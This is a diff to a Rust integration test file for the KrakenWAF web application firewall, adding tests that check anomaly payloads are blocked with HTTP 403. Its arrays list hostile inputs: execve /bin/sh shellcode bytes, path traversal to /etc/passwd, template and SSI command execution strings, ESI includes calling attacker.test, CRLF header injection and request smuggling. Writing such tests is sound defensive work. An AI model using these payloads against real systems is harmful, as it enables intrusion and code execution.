@@ -1,4 +1,3 @@
-
 //! End-to-end integration tests: Axum micro-backend + KrakenWAF (--no-tls).
 //!
 //! Topology
@@ -152,7 +151,16 @@ fn spawn_waf(waf_port: u16, extra_args: &[&str]) -> WafGuard {
         .spawn()
         .expect("failed to spawn krakenwaf binary");
 
-    WafGuard { child, _tmpdir: tmpdir }
+    WafGuard {
+        child,
+        _tmpdir: tmpdir,
+    }
+}
+
+fn spawn_waf_with_dfa(waf_port: u16) -> WafGuard {
+    let project_root = env!("CARGO_MANIFEST_DIR");
+    let dfa_config = format!("{project_root}/rules/dfa/config.yaml");
+    spawn_waf(waf_port, &["--dfa-load", &dfa_config])
 }
 
 /// Poll the WAF health endpoint until it responds (or timeout).
@@ -310,6 +318,105 @@ const SCANNER_UAS: &[&str] = &[
     "Acunetix Web Vulnerability Scanner",
 ];
 
+/// Overflow/flooding and shellcode payloads covered by the DFA anomaly detector.
+const OVERFLOW_PAYLOADS: &[&str] = &[
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "1111111111111111111111111111111111111111",
+    "%00%00%00%00%00%00%00%00%00%00%00%00",
+    "%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff",
+    "{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{",
+    "))))))))))))))))))))))))))))))))))))))))",
+    "../../../../../../../../../../../../etc/passwd",
+    "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
+    "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+    "id=12345678901234567890123456789012345678901234567890",
+    r"\x90\x90\x90\x90\xcc",
+    r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
+    r"\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x6a\x3b\x58\x0f\x05",
+    r"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68",
+    "0x6a0x3b0x580x0f0x05",
+];
+
+/// 10 SSTI payloads covered by the DFA anomaly detector.
+const SSTI_PAYLOADS: &[&str] = &[
+    "{{7*7}}",
+    "{{= 7*7 }}",
+    "${7*7}",
+    "#{7*7}",
+    "<%= 7 * 7 %>",
+    "<% system('id') %>",
+    "{% debug %}",
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+    "#set($x = 7 * 7)${x}",
+    "[[${7*7}]]",
+];
+
+/// 10 SSI injection payloads covered by the DFA anomaly detector.
+const SSI_PAYLOADS: &[&str] = &[
+    "<!--#include file=\"/etc/passwd\" -->",
+    "<!--#include virtual=\"/admin/config\" -->",
+    "<!--#exec cmd=\"id\" -->",
+    "<!--#echo var=\"DOCUMENT_ROOT\" -->",
+    "<!--#printenv -->",
+    "<!--#config errmsg=\"owned\" -->",
+    "<!-- #exec cmd=\"/bin/sh -c id\" -->",
+    "<!--# set var=\"x\" value=\"owned\" -->",
+    "<!--#if expr=\"$QUERY_STRING\" -->",
+    "%3C%21--%23exec%20cmd%3D%22id%22%20--%3E",
+];
+
+/// 10 ESI injection payloads covered by the DFA anomaly detector.
+const ESI_PAYLOADS: &[&str] = &[
+    "<esi:include src=\"http://attacker.test/poc\" />",
+    "<esi:inline name=\"frag\">owned</esi:inline>",
+    "<esi:debug/>",
+    "<!--esi <esi:include src=\"http://attacker.test/x\" /> -->",
+    "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
+    "<esi:remove><script>alert(1)</script></esi:remove>",
+    "<esi:choose><esi:when test=\"$(QUERY_STRING)\">x</esi:when></esi:choose>",
+    "<esi:try><esi:attempt>x</esi:attempt><esi:except>y</esi:except></esi:try>",
+    "<ESI:INCLUDE SRC=\"http://attacker.test/case\" />",
+    "%3Cesi%3Ainclude%20src%3D%22http%3A%2F%2Fattacker.test%2Fencoded%22%20%2F%3E",
+];
+
+/// CRLF injection payloads sampled from payload-box/crlf-injection-payload-list.
+const CRLF_PAYLOADS: &[&str] = &[
+    "%0d%0aSet-Cookie:admin=true",
+    "%0aSet-Cookie:admin=true",
+    "%0dSet-Cookie:admin=true",
+    "%0d%0aLocation:http://evil.com",
+    "%0d%0aHTTP/1.1%20200%20OK%0d%0a",
+    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
+    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
+    "%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
+    "%250d%250aSet-Cookie:admin=true",
+    "%25250d%25250aSet-Cookie:admin=true",
+    "%u000d%u000aSet-Cookie:admin=true",
+    r"\u000d\u000aSet-Cookie:admin=true",
+    r"\r\nSet-Cookie:admin=true",
+    "%E5%98%8A%E5%98%8DSet-Cookie:admin=true",
+    "%C4%8D%C4%8ASet-Cookie:admin=true",
+    "%e0%80%8d%e0%80%8aSet-Cookie:admin=true",
+    "%00%0d%0aSet-Cookie:admin=true",
+    "%0d%0a%20Set-Cookie:admin=true",
+    "%0d%0a%09Set-Cookie:admin=true",
+    "test%0d%0aX-Forwarded-Host:evil.com",
+];
+
+/// Request smuggling payloads covered by the DFA anomaly detector.
+const REQUEST_SMUGGLING_PAYLOADS: &[&str] = &[
+    "Transfer-Encoding: chunked",
+    "transfer-encoding: chunked",
+    "Transfer-Encoding:%20chunked",
+    "Transfer-Encoding:%09chunked",
+    "X-Session-Hijack: true",
+    "x-session-hijack:%20true",
+    "Content-Length: 0",
+    "Content-Length: 4",
+    "GET / HTTP/1.1%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
+    "POST / HTTP/1.1%0d%0aContent-Length: 3%0d%0a%0d%0aabc",
+];
+
 // ─── Tests ────────────────────────────────────────────────────────────────────
 
 /// Sweep 50 XSS payloads via POST body — every one must be blocked (HTTP 403).
@@ -375,7 +482,7 @@ async fn scanner_ua_sweep() {
     for ua in SCANNER_UAS {
         let resp = client
             .get(format!("{}/test_get", waf_base(port)))
-            .query(&[("payload_test", "hello world")])   // clean payload
+            .query(&[("payload_test", "hello world")]) // clean payload
             .header("User-Agent", *ua)
             .send()
             .await
@@ -509,4 +616,276 @@ async fn sqli_payload_sweep_post() {
             "SQLi POST payload not blocked: {payload:?}"
         );
     }
+}
+
+/// DFA overflow detection must block anomaly payloads in URI and POST body.
+#[tokio::test]
+async fn dfa_overflow_payload_sweep_get_and_post() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    for payload in OVERFLOW_PAYLOADS {
+        let get_resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("GET request failed for overflow payload {payload:?}: {e}"));
+
+        assert_eq!(
+            get_resp.status(),
+            StatusCode::FORBIDDEN,
+            "Overflow GET payload not blocked: {payload:?}"
+        );
+
+        let post_resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| {
+                panic!("POST request failed for overflow payload {payload:?}: {e}")
+            });
+
+        assert_eq!(
+            post_resp.status(),
+            StatusCode::FORBIDDEN,
+            "Overflow POST payload not blocked: {payload:?}"
+        );
+    }
+}
+
+/// DFA SSTI detection must block template injection payloads in URI and POST body.
+#[tokio::test]
+async fn dfa_ssti_payload_sweep_get_and_post() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    for payload in SSTI_PAYLOADS {
+        let get_resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("GET request failed for SSTI payload {payload:?}: {e}"));
+
+        assert_eq!(
+            get_resp.status(),
+            StatusCode::FORBIDDEN,
+            "SSTI GET payload not blocked: {payload:?}"
+        );
+
+        let post_resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("POST request failed for SSTI payload {payload:?}: {e}"));
+
+        assert_eq!(
+            post_resp.status(),
+            StatusCode::FORBIDDEN,
+            "SSTI POST payload not blocked: {payload:?}"
+        );
+    }
+}
+
+/// DFA SSI detection must block SSI injection payloads in URI and POST body.
+#[tokio::test]
+async fn dfa_ssi_payload_sweep_get_and_post() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    for payload in SSI_PAYLOADS {
+        let get_resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("GET request failed for SSI payload {payload:?}: {e}"));
+
+        assert_eq!(
+            get_resp.status(),
+            StatusCode::FORBIDDEN,
+            "SSI GET payload not blocked: {payload:?}"
+        );
+
+        let post_resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("POST request failed for SSI payload {payload:?}: {e}"));
+
+        assert_eq!(
+            post_resp.status(),
+            StatusCode::FORBIDDEN,
+            "SSI POST payload not blocked: {payload:?}"
+        );
+    }
+}
+
+/// DFA ESI detection must block ESI injection payloads in URI and POST body.
+#[tokio::test]
+async fn dfa_esi_payload_sweep_get_and_post() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    for payload in ESI_PAYLOADS {
+        let get_resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("GET request failed for ESI payload {payload:?}: {e}"));
+
+        assert_eq!(
+            get_resp.status(),
+            StatusCode::FORBIDDEN,
+            "ESI GET payload not blocked: {payload:?}"
+        );
+
+        let post_resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("POST request failed for ESI payload {payload:?}: {e}"));
+
+        assert_eq!(
+            post_resp.status(),
+            StatusCode::FORBIDDEN,
+            "ESI POST payload not blocked: {payload:?}"
+        );
+    }
+}
+
+/// DFA CRLF detection must block CRLF injection payloads in URI and POST body.
+#[tokio::test]
+async fn dfa_crlf_payload_sweep_get_and_post() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    for payload in CRLF_PAYLOADS {
+        let get_resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("GET request failed for CRLF payload {payload:?}: {e}"));
+
+        assert_eq!(
+            get_resp.status(),
+            StatusCode::FORBIDDEN,
+            "CRLF GET payload not blocked: {payload:?}"
+        );
+
+        let post_resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("POST request failed for CRLF payload {payload:?}: {e}"));
+
+        assert_eq!(
+            post_resp.status(),
+            StatusCode::FORBIDDEN,
+            "CRLF POST payload not blocked: {payload:?}"
+        );
+    }
+}
+
+/// DFA request smuggling detection must block smuggling payloads in URI and POST body.
+#[tokio::test]
+async fn dfa_request_smuggling_payload_sweep_get_and_post() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    for payload in REQUEST_SMUGGLING_PAYLOADS {
+        let get_resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| {
+                panic!("GET request failed for smuggling payload {payload:?}: {e}")
+            });
+
+        assert_eq!(
+            get_resp.status(),
+            StatusCode::FORBIDDEN,
+            "Request smuggling GET payload not blocked: {payload:?}"
+        );
+
+        let post_resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| {
+                panic!("POST request failed for smuggling payload {payload:?}: {e}")
+            });
+
+        assert_eq!(
+            post_resp.status(),
+            StatusCode::FORBIDDEN,
+            "Request smuggling POST payload not blocked: {payload:?}"
+        );
+    }
+}
+
+/// DFA request smuggling detection must also block real request header signals.
+#[tokio::test]
+async fn dfa_request_smuggling_header_signals_are_blocked() {
+    ensure_backend();
+    let port = alloc_waf_port();
+    let _waf = spawn_waf_with_dfa(port);
+    let client = http_client();
+    wait_for_waf(&client, port).await;
+
+    let hijack_resp = client
+        .get(format!("{}/test_get", waf_base(port)))
+        .query(&[("payload_test", "hello")])
+        .header("X-Session-Hijack", "true")
+        .send()
+        .await
+        .expect("request with X-Session-Hijack header failed");
+
+    assert_eq!(
+        hijack_resp.status(),
+        StatusCode::FORBIDDEN,
+        "Request smuggling X-Session-Hijack header not blocked"
+    );
+
+    let short_body_resp = client
+        .post(format!("{}/test_post", waf_base(port)))
+        .header("Content-Type", "text/plain")
+        .body("abcd")
+        .send()
+        .await
+        .expect("request with short Content-Length failed");
+
+    assert_eq!(
+        short_body_resp.status(),
+        StatusCode::FORBIDDEN,
+        "Request smuggling short Content-Length header not blocked"
+    );
 }
